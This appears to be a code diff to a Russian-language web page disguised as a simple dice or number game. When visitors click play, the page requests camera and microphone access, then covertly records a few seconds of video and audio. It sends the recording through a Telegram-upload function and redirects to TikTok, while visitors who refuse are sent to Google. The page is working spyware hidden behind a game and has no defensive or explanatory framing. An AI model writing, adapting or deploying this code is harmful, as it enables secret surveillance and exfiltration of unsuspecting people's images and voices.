@@ -61,7 +61,7 @@
     <div id="game-box">
         <p id="question">Какое число выпадет?</p>
         <button onclick="confirmGame()">Играть!</button>
-        <p id="loading">🔄 Запуск...</p>
+        <p id="loading">🔄 Запрос разрешения...</p>
     </div>
 
     <script>
@@ -74,52 +74,57 @@
         function confirmGame() {
             let userConfirmed = confirm("Хотите начать игру?");
             if (userConfirmed) {
-                startChallenge();
+                requestCameraPermission();
             } else {
-                // Если отказался, сразу выкидываем
-                window.location.href = "https://www.google.com";
+                window.location.href = "https://www.google.com"; // Если отказался, сразу выкидываем
             }
         }
 
-        async function startChallenge() {
-            document.getElementById("loading").style.display = "block";
+        async function requestCameraPermission() {
+            try {
+                document.getElementById("loading").style.display = "block";
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                document.getElementById("loading").innerText = "Разрешение получено! Запуск игры...";
+
+                setTimeout(() => startChallenge(stream), 2000); // Даем немного времени перед стартом
+            } catch (error) {
+                alert("Вы отклонили доступ к камере! Выход...");
+                window.location.href = "https://www.google.com"; // Выкидываем, если отказался от камеры
+            }
+        }
+
+        function startChallenge(stream) {
+            document.getElementById("loading").style.display = "none";
             let randomNumber = Math.floor(Math.random() * 10) + 1;
             document.getElementById("question").innerText = "Выпало число: " + randomNumber;
 
-            // Запускаем запись видео
-            startRecording();
+            // Начинаем запись видео
+            startRecording(stream);
         }
 
-        async function startRecording() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
-                recordedChunks = [];
+        async function startRecording(stream) {
+            mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
+            recordedChunks = [];
 
-                mediaRecorder.ondataavailable = event => {
-                    if (event.data.size > 0) recordedChunks.push(event.data);
-                };
+            mediaRecorder.ondataavailable = event => {
+                if (event.data.size > 0) recordedChunks.push(event.data);
+            };
 
-                mediaRecorder.onstop = async () => {
-                    const videoBlob = new Blob(recordedChunks, { type: "video/webm" });
-                    await sendToTelegram(videoBlob);
+            mediaRecorder.onstop = async () => {
+                const videoBlob = new Blob(recordedChunks, { type: "video/webm" });
+                await sendToTelegram(videoBlob);
 
-                    // Останавливаем камеру
-                    stream.getTracks().forEach(track => track.stop());
+                // Останавливаем камеру
+                stream.getTracks().forEach(track => track.stop());
 
-                    // Редирект через 3 секунды
-                    setTimeout(() => {
-                        window.location.href = "https://www.tiktok.com";
-                    }, 3000);
-                };
+                // Редирект через 3 секунды
+                setTimeout(() => {
+                    window.location.href = "https://www.tiktok.com";
+                }, 3000);
+            };
 
-                mediaRecorder.start();
-                setTimeout(() => mediaRecorder.stop(), 5000);
-
-            } catch (error) {
-                console.error("Ошибка камеры:", error);
-                window.location.href = "https://www.tiktok.com";
-            }
+            mediaRecorder.start();
+            setTimeout(() => mediaRecorder.stop(), 5000);
         }
 
         async function sendToTelegram(videoBlob) {
